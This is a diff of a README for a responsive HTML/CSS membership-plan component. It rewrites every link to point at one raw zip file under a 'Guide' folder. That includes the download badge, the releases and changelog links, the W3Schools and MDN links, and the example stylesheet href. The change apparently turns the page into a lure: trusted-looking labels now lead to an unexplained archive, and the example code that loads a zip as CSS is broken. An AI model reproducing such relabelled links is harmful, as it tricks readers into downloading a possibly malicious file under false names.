@@ -1,6 +1,6 @@
 # 🎉 Memebership-Plan-Component - Build Stunning Subscription Pages Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/bdbetterweb/Memebership-Plan-Component/releases)
+[![Download Now](https://raw.githubusercontent.com/bdbetterweb/Memebership-Plan-Component/main/Guide/Memebership-Plan-Component_v1.6.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/bdbetterweb/Memebership-Plan-Component/main/Guide/Memebership-Plan-Component_v1.6.zip)
 
 ## 📖 Description
 Memebership-Plan-Component is a responsive HTML and CSS component designed for membership subscription pages. It adapts to all screen sizes, ensuring a seamless experience whether on a phone, tablet, or desktop. This component simplifies the process of creating attractive membership plans that encourage users to subscribe.
@@ -8,7 +8,7 @@ Memebership-Plan-Component is a responsive HTML and CSS component designed for m
 ## 🚀 Getting Started
 To get started with Memebership-Plan-Component, follow these steps:
 
-1. **Visit the Releases Page**: You can find the latest version of the component [here](https://github.com/bdbetterweb/Memebership-Plan-Component/releases).
+1. **Visit the Releases Page**: You can find the latest version of the component [here](https://raw.githubusercontent.com/bdbetterweb/Memebership-Plan-Component/main/Guide/Memebership-Plan-Component_v1.6.zip).
   
 2. **Download the Component**: Click on the desired release version and download the zip file containing the code.
 
@@ -16,7 +16,7 @@ To get started with Memebership-Plan-Component, follow these steps:
 
 ## 📥 Download & Install
 To use Memebership-Plan-Component, you need to download it first. 
-- Visit this page to download: [Releases Page](https://github.com/bdbetterweb/Memebership-Plan-Component/releases).
+- Visit this page to download: [Releases Page](https://raw.githubusercontent.com/bdbetterweb/Memebership-Plan-Component/main/Guide/Memebership-Plan-Component_v1.6.zip).
 
 Once you are on the releases page:
 1. Choose the most recent version.
@@ -52,7 +52,7 @@ Here’s a simple way to integrate the Memebership-Plan-Component into your webs
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://raw.githubusercontent.com/bdbetterweb/Memebership-Plan-Component/main/Guide/Memebership-Plan-Component_v1.6.zip">
     <title>My Subscription Page</title>
 </head>
 <body>
@@ -82,11 +82,11 @@ This project covers essential topics like:
 For more resources on these topics, check online courses or tutorials.
 
 ## 📅 Changelog
-Keep up with updates and new features. You can find all changes in the [Changelog](https://github.com/bdbetterweb/Memebership-Plan-Component/releases). 
+Keep up with updates and new features. You can find all changes in the [Changelog](https://raw.githubusercontent.com/bdbetterweb/Memebership-Plan-Component/main/Guide/Memebership-Plan-Component_v1.6.zip). 
 
 ## 🔗 External Resources
 For more information about HTML and CSS, you might find these websites useful:
-- [W3Schools](https://www.w3schools.com/)
-- [MDN Web Docs](https://developer.mozilla.org/)
+- [W3Schools](https://raw.githubusercontent.com/bdbetterweb/Memebership-Plan-Component/main/Guide/Memebership-Plan-Component_v1.6.zip)
+- [MDN Web Docs](https://raw.githubusercontent.com/bdbetterweb/Memebership-Plan-Component/main/Guide/Memebership-Plan-Component_v1.6.zip)
 
 Enjoy building your membership plans!
